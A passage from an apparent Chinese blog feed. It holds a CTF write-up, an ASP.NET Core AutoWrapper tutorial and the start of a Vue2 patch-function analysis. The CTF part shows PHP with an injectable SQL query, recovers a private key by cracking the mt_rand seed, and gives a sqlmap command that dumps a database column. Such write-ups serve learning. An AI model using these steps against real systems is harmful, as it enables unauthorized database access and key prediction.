        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = &quot;SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'&quot;.';'; 
        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
        mysql_select_db(&quot;test&quot;,$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;.$row[&quot;username&quot;].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$row[&quot;flag&quot;].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;;
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i &amp;lt; $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i &amp;lt; $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看完后可以知道，这里需要求私钥，然后再登录的password那里存在sql注入，flag应该就再user表里&lt;/p&gt;
&lt;p&gt;公钥和私钥的生成用的是 mt_rand() 函数，那么这里考查的应该是php伪随机性&lt;/p&gt;
&lt;p&gt;详细可以参考wonderkun师傅的博客：[&lt;a href=&quot;http://wonderkun.cc/2017/03/16/php%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90/&quot;&gt;http://wonderkun.cc/2017/03/16/php的随机数的安全性分析/&lt;/a&gt;]：&lt;/p&gt;
&lt;p&gt;之前一月的安恒祈福赛也考过&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mt_rand函数是伪随机性，只要使用相同的种子，所生成的随机数序列一定是固定的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;但是在前面的内容里我们，并没有看到设置种子，那么它这里应该是用mt_rand函数自动播种，&lt;strong&gt;而在php中使用mt_rand函数产生一系列的随机数时，它的自动播种只进行了一次!（即多次调用 mt_rand()函数之前,只播种一次种子）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里公钥已经告诉了，那么可以通过它来求种子&lt;/p&gt;
&lt;p&gt;那么首先获得已知$Public_key的每一位在$strings1中的位置:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
str2 = 'KVQP0LdJKRaV3n9D'
res = ''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' '
            break

P = [0 for i in range(17)]
print(P)
#整理成方便 php_mt_seed 测试的格式
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后使用php_mt_seed爆破种子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330225753728-998353622.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;得到种子1775196155（注意种子对应的PHP版本）&lt;/p&gt;
&lt;p&gt;然后就设置种子，这里我猜测它应该是先生成公钥在生成私钥：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php
mt_srand(1775196155);//爆破出来的种子
$str_long1 = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;
$str='';
$len1=16;
for ( $i = 0; $i &amp;lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo &quot;&amp;lt;p id='p1'&amp;gt;&quot;.$str.&quot;&amp;lt;/p&amp;gt;&quot;;
$str='';
$len1=12;
for ( $i = 0; $i &amp;lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo &quot;&amp;lt;p id='p1'&amp;gt;&quot;.$str.&quot;&amp;lt;/p&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;p id='p1'&amp;gt;KVQP0LdJKRaV3n9D&amp;lt;/p&amp;gt;&amp;lt;p id='p1'&amp;gt;XuNhoueCDCGc&amp;lt;/p&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里可以看到前面的公钥和题目告诉的公钥一样，后面的就是私钥&lt;/p&gt;
&lt;p&gt;用私钥登录进去什么都没有，那么flag在数据库里没得跑了，这里试了一下貌似没什么过滤，那直接sqlmap一把梭&lt;br/&gt;先去抓个包，然后保存成文件，-p指定参数&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python sqlmap.py -r C:\Users\lenovo\Desktop\sql.txt -p password -D test -T user -C flag --dump
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;拿到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330225923540-1104339317.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;ezmisc&quot;&gt;ezmisc&lt;/h2&gt;
&lt;p&gt;png高度隐写,010修改以下高度就行。。&lt;/p&gt;
&lt;h2 id=&quot;千层套娃&quot;&gt;千层套娃&lt;/h2&gt;
&lt;p&gt;这题刚开始和BJDCTF的TARGZ-Y1ng一样（实在是太爽了~~哈哈），拿之前的脚本修改一下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/env python
# encoding: utf-8
import os
import filetype
import time
#sleep的单位是秒

number = 0
while 1:
        aa = os.popen('ls')
        filename = aa.read().replace('decompress.py','').replace('\n', '')
        a = filename.replace('.zip', '')
        kind = filetype.guess(filename)
        #guess相当于加载文件
        number += 1 
        try:
                if kind.extension is 'zip':
                        #extension是获取文件类型
                        os.system(&quot;unzip -P {} {}.zip&quot;.format( a, a))
                        time.sleep(0.01)
                        os.system(&quot;rm {}.zip&quot;.format(a))
                        time.sleep(0.01)
        except Exception as e:
                print('解压完成')
                print('解压了 {} 次'.format(str(number)))
                break
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;得到一堆rgb&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330230807687-851000075.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;名字是qr，估计是个二维码，&lt;br/&gt;RGB转图片脚本如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#!/usr/bin/env python
# encoding: utf-8
from PIL import Image

x = 200    #x坐标  通过对txt里的行数进行整数分解
y = 200    #y坐标  x * y = 行数

im = Image.new(&quot;RGB&quot;, (x, y))   #创建图片
file = open('qr.txt')    #打开rbg值的文件

#通过每个rgb点生成图片

for i in range(0, x):
    for j in range(0, y):
        line=file.readline()
        rgb = line.split(&quot;\n&quot;)
        rgb = rgb[0]
        rgb=rgb.replace('(','')
        rgb=rgb.replace(')','')
        rgb = rgb.split(&quot;, &quot;)
        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))    #将rgb转化为像素

im.show()   #也可用im.save('flag.jpg')保存下来
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;扫码得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330230925304-1604386289.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;不眠之夜&quot;&gt;不眠之夜&lt;/h2&gt;
&lt;p&gt;纯手工拼。。&lt;/p&gt;
&lt;p&gt;听说有工具，之后在学习一波&lt;/p&gt;
&lt;h2 id=&quot;寻找xxx&quot;&gt;寻找xxx&lt;/h2&gt;
&lt;p&gt;是个wav文件，Au打开，很明显的DTMF拨号音，那么选择频谱图，设置一下最高和最低频率，窗口大小和补零因子，方便观察&lt;/p&gt;
&lt;p&gt;详细参考：[&lt;a href=&quot;http://blog.sina.com.cn/s/blog_3cef24f001018m8v.html&quot;&gt;http://blog.sina.com.cn/s/blog_3cef24f001018m8v.html&lt;/a&gt;]：&lt;/p&gt;
&lt;p&gt;然后对照表来分析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232134720-759544804.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;unravel&quot;&gt;Unravel!!&lt;/h2&gt;
&lt;p&gt;题目描述：音乐一响。。。又回想起了在东京吃人的日子&lt;/p&gt;
&lt;p&gt;真是怀念啊，初三开始看的，现在已经完结了。。。&lt;/p&gt;
&lt;p&gt;不说了，下面是正题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232539694-2097253138.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;开场给了三个文件，win-zip需要密码（&lt;s&gt;我最怕这种文件给的多的了，感觉b格很高不敢下手&lt;/s&gt;）&lt;/p&gt;
&lt;p&gt;我首先看的是wav，因为最近的比赛老是碰到音频的题目。。&lt;/p&gt;
&lt;p&gt;打开听了一下很正常，Au分析一下也什么都没有，kali里binwalk一下还是什么都没有，然后感觉Look_at_the_file_ending.wav这个文件名有点东西，说看一下这个文件的结尾，010打开看了下，果然有东西&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232735715-1144084578.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看着眼熟想不起来是啥了，base64解了一下是一堆乱七八糟的东西，不管了先放着&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后看了一下png，windows能正常打开，放到kali里也能正常打开，没什么不对的地方&lt;/p&gt;
&lt;p&gt;binwalk跑一下，发现有zip，那就foremost分离&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232821426-464727063.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;zip解压后打开&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232842083-848062111.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里它的文件名是aes.png&lt;/p&gt;
&lt;p&gt;在联想到之前的加密数据，我说怎么看着有点眼熟，原来是aes，那么Tokyo应该就是密码了&lt;br/&gt;在线解AES&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232858934-384117672.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;得到CCGandGulu，这个就是win-win.zip的密码&lt;/p&gt;
&lt;p&gt;解压后又是个wav，一顿操作后什么，都没发现。。&lt;/p&gt;
&lt;p&gt;后来想到之前做音频隐写的时候听过有音频的LSB隐写，但是一直没遇到&lt;/p&gt;
&lt;p&gt;简单了解&lt;/p&gt;
&lt;p&gt;SilentEye是一个跨平台的应用程序设计，可以轻松地使用隐写术，在这种情况下，可以将消息隐藏到图片或声音中。它提供了一个很好的界面，并通过使用插件系统轻松集成了新的隐写算法和加密过程。如果之前不了解这款软件，一般是很难发现图片或声音中藏有秘密。&lt;/p&gt;
&lt;p&gt;然后用slienteye来解密，就拿到flag了 ~ ~ 嘿嘿&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330232946851-1509747360.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 30 Mar 2020 15:31:00 +0000</pubDate>
<dc:creator>lceFIre</dc:creator>
<og:description>前言 周末做了一下北邮的CTF，这里记录一下做出来的几道题。(PS：比较菜有很多没做出来 _ SetHandler application/x httpd php 蚁剑配置 http://2b8739</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/lceFIre/p/12602233.html</dc:identifier>
</item>
<item>
<title>ASP.NET Core AutoWrapper 自定义响应输出 - HueiFeng</title>
<link>http://www.cnblogs.com/yyfh/p/12602087.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yyfh/p/12602087.html</guid>
<description>&lt;p&gt;AutoWrapper是一个简单可自定义全局异常处理程序和ASP.NET Core API响应的包装。他使用ASP.NET Core middleware拦截传入的HTTP请求，并将最后的结果使用统一的格式来自动包装起来.目的主要是让我们更多的关注业务特定的代码要求，并让包装器自动处理HTTP响应。这可以在构建API时加快开发时间，同时为HTTP响应试试我们统一的标准。&lt;/p&gt;

&lt;p&gt;AutoWrapper.Core从NuGet或通过CLI下载并安装&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;PM&amp;gt; Install-Package AutoWrapper.Core 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在Startup.cs Configure方法中注册以下内容，但是切记要放在UseRouting前&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;app.UseApiResponseAndExceptionWrapper();  
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;默认情况下AutoWrapper将在成功请求成功时输出以下格式：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;message&quot;: &quot;Request successful.&quot;,
    &quot;isError&quot;: false,
    &quot;result&quot;: [
      {
        &quot;id&quot;: 7002,
        &quot;firstName&quot;: &quot;Vianne&quot;,
        &quot;lastName&quot;: &quot;Durano&quot;,
        &quot;dateOfBirth&quot;: &quot;2018-11-01T00:00:00&quot;
      }
    ]
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果说不喜欢默认属性命名方式，那么我们可以通过AutoWrapperPropertyMap属性进行映射为我们需要指定的任何名称。例如我么可以将result属性的名称更改为data。如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class MapResponseObject  
{
    [AutoWrapperPropertyMap(Prop.Result)]
    public object Data { get; set; }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后将MapResponseObject类传递给AutpWrapper middleware&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;app.UseApiResponseAndExceptionWrapper&amp;lt;MapResponseObject&amp;gt;();  
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过映射重新请求后，现在影响格式如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;message&quot;: &quot;Request successful.&quot;,
    &quot;isError&quot;: false,
    &quot;data&quot;: {
        &quot;id&quot;: 7002,
        &quot;firstName&quot;: &quot;Vianne&quot;,
        &quot;lastName&quot;: &quot;Durano&quot;,
        &quot;dateOfBirth&quot;: &quot;2018-11-01T00:00:00&quot;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以从中看出result属性已经更换为data属性了&lt;/p&gt;
&lt;p&gt;默认情况下AutoWrapper发生异常时将吐出以下响应格式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;isError&quot;: true,
    &quot;responseException&quot;: {
        &quot;exceptionMessage&quot;: &quot;Unhandled Exception occurred. Unable to process the request.&quot;
    }
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而且如果在AutoWrapperOptions中设置了IsDebug，则将产生带有堆栈跟踪信息的类似信息&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;isError&quot;: true,
    &quot;responseException&quot;: {
        &quot;exceptionMessage&quot;: &quot; Input string was not in a correct format.&quot;,
        &quot;details&quot;: &quot;   at System.Number.ThrowOverflowOrFormatException(ParsingStatus status, TypeCode type)\r\n   at System.Number.ParseInt32(ReadOnlySpan`1 value, NumberStyles styles, NumberFormatInfo info)\r\n …&quot;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果想将某些APIError属性名称更改为其他名称，只需要在以下代码中添加以下映射MapResponseObject&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class MapResponseObject  
{
    [AutoWrapperPropertyMap(Prop.ResponseException)]
    public object Error { get; set; }

    [AutoWrapperPropertyMap(Prop.ResponseException_ExceptionMessage)]
    public string Message { get; set; }

    [AutoWrapperPropertyMap(Prop.ResponseException_Details)]
    public string StackTrace { get; set; }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过如下代码来模拟错误&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int num = Convert.ToInt32(&quot;10s&quot;); 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在映射后的输出如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;isError&quot;: true,
    &quot;error&quot;: {
        &quot;message&quot;: &quot; Input string was not in a correct format.&quot;,
        &quot;stackTrace&quot;: &quot;   at System.Number.ThrowOverflowOrFormatException(ParsingStatus status, TypeCode type)\r\n   at System.Number.ParseInt32(ReadOnlySpan`1 value, NumberStyles styles, NumberFormatInfo info)\r\n …&quot;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;请注意APIError现在根据MapResponseObject类中定义的属性更改了模型的默认属性。&lt;/p&gt;
&lt;p&gt;我们可以自由的选择映射任何属性，下面是映射属性相对应的列表&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[AutoWrapperPropertyMap(Prop.Version)]
[AutoWrapperPropertyMap(Prop.StatusCode)]
[AutoWrapperPropertyMap(Prop.Message)]
[AutoWrapperPropertyMap(Prop.IsError)]
[AutoWrapperPropertyMap(Prop.Result)]
[AutoWrapperPropertyMap(Prop.ResponseException)]
[AutoWrapperPropertyMap(Prop.ResponseException_ExceptionMessage)]
[AutoWrapperPropertyMap(Prop.ResponseException_Details)]
[AutoWrapperPropertyMap(Prop.ResponseException_ReferenceErrorCode)]
[AutoWrapperPropertyMap(Prop.ResponseException_ReferenceDocumentLink)]
[AutoWrapperPropertyMap(Prop.ResponseException_ValidationErrors)]
[AutoWrapperPropertyMap(Prop.ResponseException_ValidationErrors_Field)]
[AutoWrapperPropertyMap(Prop.ResponseException_ValidationErrors_Message)]
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;AutoWrapper还提供了一个APIException可用于定义自己的异常的对象，如果想抛出自己的异常消息，则可以简单地执行以下操作&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;throw new ApiException(&quot;Error blah&quot;, 400, &quot;511&quot;, &quot;http://blah.com/error/511&quot;);  
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认输出格式如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;isError&quot;: true,
    &quot;responseException&quot;: {
        &quot;exceptionMessage&quot;: &quot;Error blah&quot;,
        &quot;referenceErrorCode&quot;: &quot;511&quot;,
        &quot;referenceDocumentLink&quot;: &quot;http://blah.com/error/511&quot;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然我们可以自定义错误格式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class MapResponseObject  
{
    [AutoWrapperPropertyMap(Prop.ResponseException)]
    public object Error { get; set; }
}

public class Error  
{
    public string Message { get; set; }

    public string Code { get; set; }
    public InnerError InnerError { get; set; }

    public Error(string message, string code, InnerError inner)
    {
        this.Message = message;
        this.Code = code;
        this.InnerError = inner;
    }

}

public class InnerError  
{
    public string RequestId { get; set; }
    public string Date { get; set; }

    public InnerError(string reqId, string reqDate)
    {
        this.RequestId = reqId;
        this.Date = reqDate;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后我们可以通过如下代码进行引发我们错误&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;throw new ApiException(  
      new Error(&quot;An error blah.&quot;, &quot;InvalidRange&quot;,
      new InnerError(&quot;12345678&quot;, DateTime.Now.ToShortDateString())
));
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出格式如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;isError&quot;: true,
    &quot;error&quot;: {
        &quot;message&quot;: &quot;An error blah.&quot;,
        &quot;code&quot;: &quot;InvalidRange&quot;,
        &quot;innerError&quot;: {
            &quot;requestId&quot;: &quot;12345678&quot;,
            &quot;date&quot;: &quot;10/16/2019&quot;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;如果映射满足不了我们的需求。并且我们需要向API响应模型中添加其他属性，那么我们现在可以自定义自己的格式类，通过设置UseCustomSchema为true来实现，代码如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;app.UseApiResponseAndExceptionWrapper(new AutoWrapperOptions { UseCustomSchema = true });  
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在假设我们想在主API中响应中包含一个属性SentDate和Pagination对象，我们可能希望将API响应模型定义为以下格式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class MyCustomApiResponse  
{
    public int Code { get; set; }
    public string Message { get; set; }
    public object Payload { get; set; }
    public DateTime SentDate { get; set; }
    public Pagination Pagination { get; set; }

    public MyCustomApiResponse(DateTime sentDate, object payload = null, string message = &quot;&quot;, int statusCode = 200, Pagination pagination = null)
    {
        this.Code = statusCode;
        this.Message = message == string.Empty ? &quot;Success&quot; : message;
        this.Payload = payload;
        this.SentDate = sentDate;
        this.Pagination = pagination;
    }

    public MyCustomApiResponse(DateTime sentDate, object payload = null, Pagination pagination = null)
    {
        this.Code = 200;
        this.Message = &quot;Success&quot;;
        this.Payload = payload;
        this.SentDate = sentDate;
        this.Pagination = pagination;
    }

    public MyCustomApiResponse(object payload)
    {
        this.Code = 200;
        this.Payload = payload;
    }

}

public class Pagination  
{
    public int TotalItemsCount { get; set; }
    public int PageSize { get; set; }
    public int CurrentPage { get; set; }
    public int TotalPages { get; set; }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过如下代码片段进行测试结果&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public async Task&amp;lt;MyCustomApiResponse&amp;gt; Get()  
{
    var data = await _personManager.GetAllAsync();

    return new MyCustomApiResponse(DateTime.UtcNow, data,
        new Pagination
        {
            CurrentPage = 1,
            PageSize = 10,
            TotalItemsCount = 200,
            TotalPages = 20
        });

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行后会得到如下影响格式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
{
    &quot;code&quot;: 200,
    &quot;message&quot;: &quot;Success&quot;,
    &quot;payload&quot;: [
        {
            &quot;id&quot;: 1,
            &quot;firstName&quot;: &quot;Vianne&quot;,
            &quot;lastName&quot;: &quot;Durano&quot;,
            &quot;dateOfBirth&quot;: &quot;2018-11-01T00:00:00&quot;
        },
        {
            &quot;id&quot;: 2,
            &quot;firstName&quot;: &quot;Vynn&quot;,
            &quot;lastName&quot;: &quot;Durano&quot;,
            &quot;dateOfBirth&quot;: &quot;2018-11-01T00:00:00&quot;
        },
        {
            &quot;id&quot;: 3,
            &quot;firstName&quot;: &quot;Mitch&quot;,
            &quot;lastName&quot;: &quot;Durano&quot;,
            &quot;dateOfBirth&quot;: &quot;2018-11-01T00:00:00&quot;
        }
    ],
    &quot;sentDate&quot;: &quot;2019-10-17T02:26:32.5242353Z&quot;,
    &quot;pagination&quot;: {
        &quot;totalItemsCount&quot;: 200,
        &quot;pageSize&quot;: 10,
        &quot;currentPage&quot;: 1,
        &quot;totalPages&quot;: 20
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是从这里要注意一旦我们对API响应进行自定义，那么就代表我们完全控制了要格式化数据的方式，同时丢失了默认API响应的某些选项配置。但是我们仍然可以利用ApiException()方法引发用户定义的错误消息&lt;br/&gt;如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[Route(&quot;{id:long}&quot;)]
[HttpPut]
public async Task&amp;lt;MyCustomApiResponse&amp;gt; Put(long id, [FromBody] PersonDTO dto)  
{
    if (ModelState.IsValid)
    {
        try
        {
            var person = _mapper.Map&amp;lt;Person&amp;gt;(dto);
            person.ID = id;

            if (await _personManager.UpdateAsync(person))
                return new MyCustomApiResponse(DateTime.UtcNow, true, &quot;Update successful.&quot;);
            else
                throw new ApiException($&quot;Record with id: {id} does not exist.&quot;, 400);
        }
        catch (Exception ex)
        {
            _logger.Log(LogLevel.Error, ex, &quot;Error when trying to update with ID:{@ID}&quot;, id);
            throw;
        }
    }
    else
        throw new ApiException(ModelState.AllErrors());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在当进行模型验证时，可以获得默认响应格式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;isError&quot;: true,
    &quot;responseException&quot;: {
        &quot;exceptionMessage&quot;: &quot;Request responded with validation error(s). Please correct the specified validation errors and try again.&quot;,
        &quot;validationErrors&quot;: [
            {
                &quot;field&quot;: &quot;FirstName&quot;,
                &quot;message&quot;: &quot;'First Name' must not be empty.&quot;
            }
        ]
    }
}

&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/proudmonkey/AutoWrapper&quot;&gt;https://github.com/proudmonkey/AutoWrapper&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 30 Mar 2020 15:08:00 +0000</pubDate>
<dc:creator>HueiFeng</dc:creator>
<og:description>前言 AutoWrapper是一个简单可自定义全局异常处理程序和ASP.NET Core API响应的包装。他使用ASP.NET Core middleware拦截传入的HTTP请求，并将最后的结果使</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yyfh/p/12602087.html</dc:identifier>
</item>
<item>
<title>vue2源码分析:patch函数 - 陈蒙的技术空间</title>
<link>http://www.cnblogs.com/chenmeng2062/p/12552302.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenmeng2062/p/12552302.html</guid>
<description>&lt;p&gt;目录&lt;/p&gt;
&lt;p&gt;1.patch函数的脉络&lt;/p&gt;
&lt;p&gt;2.类vnode的设计&lt;/p&gt;
&lt;p&gt;3.createPatch函数中的辅助函数和patch函数&lt;/p&gt;
&lt;p&gt;4.源码运行展示(DEMO)&lt;/p&gt;

&lt;p&gt;&lt;span&gt;首先梳理一下patch函数的脉络。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;第一，patch核心函数createPatchFunction，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;然后，runtime/index.js中将patch方法挂载到vue的原型属性__patch__上。&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Vue.prototype.__patch__ = inBrowser ? patch : noop&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最后patch的使用是当我们调用vue实例的$el时，即调用patch函数。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;prevVnode) {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; initial render&lt;/span&gt;
  vm.$el = vm.__patch__(vm.$el, vnode, hydrating, &lt;span&gt;false&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; removeOnly &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;)
} &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; updates&lt;/span&gt;
  vm.$el =&lt;span&gt; vm.__patch__(prevVnode, vnode)
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;span&gt;其中，createPatchFunction函数结构&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;57&quot;&gt;
&lt;pre&gt;
&lt;span&gt;export &lt;span&gt;function&lt;/span&gt;&lt;span&gt; createPatchFunction (backend) {
   let i, j
  const cbs &lt;/span&gt;=&lt;span&gt; {}

  const { modules, nodeOps } &lt;/span&gt;=&lt;span&gt; backend;
  
   ,,,hooks和modules的 for循环
   其中const hooks &lt;/span&gt;= ['create', 'activate', 'update', 'remove', 'destroy'&lt;span&gt;]

   一些辅助函数
